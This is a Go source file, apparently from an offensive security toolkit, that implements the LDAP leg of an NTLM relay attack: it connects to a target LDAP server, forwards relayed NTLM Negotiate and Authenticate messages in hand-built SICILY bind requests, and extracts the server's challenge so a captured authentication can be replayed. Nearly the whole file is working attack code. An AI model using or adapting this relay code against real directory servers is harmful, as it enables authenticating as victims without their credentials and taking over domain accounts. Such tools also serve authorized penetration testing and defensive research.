package commands

import (
	"bytes"
	"fmt"
	"net"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
)

// LDAP NTLM relay bind implementation using raw BER packets.
// Implements the SICILY/NTLM authentication mechanism over LDAP:
//   Step 1: BindRequest with Type 1 (Negotiate) → get Type 2 (Challenge)
//   Step 2: BindRequest with Type 3 (Authenticate) → get success/failure
//
// MS-ADTS specifies NTLM over LDAP uses:
//   - First bind: version=3, name="", auth=context[3](Type1)  [SICILY Negotiate]
//   - Response: BindResponse with serverSaslCreds containing Type 2
//   - Second bind: version=3, name="", auth=context[3](Type3) [SICILY Response]
//   - Response: BindResponse with success (resultCode=0)

const (
	ldapAppBindRequest  = 0
	ldapAppBindResponse = 1
)

type ldapRelayConn struct {
	conn net.Conn
	msgID int64
}

func ldapRelayDial(target string, port int, timeout time.Duration) (*ldapRelayConn, error) {
	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", addr, err)
	}
	_ = conn.SetDeadline(time.Now().Add(timeout))
	return &ldapRelayConn{conn: conn, msgID: 1}, nil
}

func (lc *ldapRelayConn) close() {
	lc.conn.Close()
}

// negotiate sends an LDAP BindRequest containing the NTLM Type 1 message
// and returns the NTLM Type 2 challenge from the server's BindResponse.
func (lc *ldapRelayConn) negotiate(ntlmType1 []byte) ([]byte, error) {
	// Build: SEQUENCE { INTEGER(msgID), APPLICATION[0] { INTEGER(3), ""(name), CONTEXT[3](ntlmType1) } }
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
	lc.msgID++

	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))

	// SICILY: auth is context-specific [3] PRIMITIVE with the NTLM token
	// TagEnumerated (10) in context class = SICILY Negotiate
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.TagEnumerated, nil, "NTLM Negotiate")
	auth.Value = ntlmType1
	_, _ = auth.Data.Write(ntlmType1)
	bindReq.AppendChild(auth)

	packet.AppendChild(bindReq)

	// Send
	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return nil, fmt.Errorf("write negotiate: %w", err)
	}

	// Read response
	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return nil, fmt.Errorf("read negotiate response: %w", err)
	}

	return lc.extractBindResponseCreds(respPacket)
}

// authenticate sends an LDAP BindRequest containing the NTLM Type 3 message
// and returns nil on success or an error if authentication failed.
func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
	lc.msgID++

	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))

	// SICILY: auth is context-specific [3] PRIMITIVE with the NTLM Type 3
	// TagEmbeddedPDV (11) in context class = SICILY Response
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.TagEmbeddedPDV, nil, "NTLM Authenticate")
	auth.Value = ntlmType3
	_, _ = auth.Data.Write(ntlmType3)
	bindReq.AppendChild(auth)

	packet.AppendChild(bindReq)

	_, err := lc.conn.Write(packet.Bytes())
	if err != nil {
		return fmt.Errorf("write authenticate: %w", err)
	}

	respPacket, err := ber.ReadPacket(lc.conn)
	if err != nil {
		return fmt.Errorf("read authenticate response: %w", err)
	}

	resultCode, errMsg := lc.parseBindResult(respPacket)
	if resultCode != 0 {
		return fmt.Errorf("LDAP bind failed (code %d): %s", resultCode, errMsg)
	}
	return nil
}

func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, error) {
	// LDAP Message: SEQUENCE { INTEGER(msgID), APPLICATION[1](BindResponse) { ... } }
	if len(packet.Children) < 2 {
		return nil, fmt.Errorf("malformed LDAP response: expected 2+ children, got %d", len(packet.Children))
	}

	bindResp := packet.Children[1]
	if bindResp.Tag != ldapAppBindResponse {
		return nil, fmt.Errorf("expected BindResponse (tag 1), got tag %d", bindResp.Tag)
	}

	// BindResponse: SEQUENCE { resultCode, matchedDN, diagnosticMessage, [7]serverSaslCreds? }
	// The server SASL creds (NTLM Type 2) is in the last child with context tag 7
	for _, child := range bindResp.Children {
		if child.ClassType == ber.ClassContext && child.Tag == 7 {
			// This is the serverSaslCreds — contains NTLM Type 2
			creds := child.ByteValue
			if len(creds) == 0 {
				creds = child.Data.Bytes()
			}
			if len(creds) > 0 {
				return creds, nil
			}
		}
	}

	// Check if result code indicates failure
	resultCode, errMsg := lc.parseBindResult(packet)
	if resultCode == 14 {
		// saslBindInProgress — look for NTLM data in a different location
		// Sometimes it's in the diagnosticMessage field
		if len(bindResp.Children) >= 2 {
			for _, child := range bindResp.Children {
				data := child.ByteValue
				if len(data) == 0 {
					data = child.Data.Bytes()
				}
				if len(data) >= 8 && bytes.HasPrefix(data, sniffNTLMSig) {
					return data, nil
				}
			}
		}
		return nil, fmt.Errorf("saslBindInProgress but no NTLM challenge found")
	}

	return nil, fmt.Errorf("no server SASL creds in bind response (resultCode=%d, msg=%s)", resultCode, errMsg)
}

func (lc *ldapRelayConn) parseBindResult(packet *ber.Packet) (int64, string) {
	if len(packet.Children) < 2 {
		return -1, "malformed response"
	}
	bindResp := packet.Children[1]
	if len(bindResp.Children) < 3 {
		return -1, "malformed bind response"
	}

	resultCode, ok := bindResp.Children[0].Value.(int64)
	if !ok {
		return -1, "cannot parse result code"
	}

	errMsg := ""
	if bindResp.Children[2].Value != nil {
		errMsg = fmt.Sprintf("%v", bindResp.Children[2].Value)
	}

	return resultCode, errMsg
}
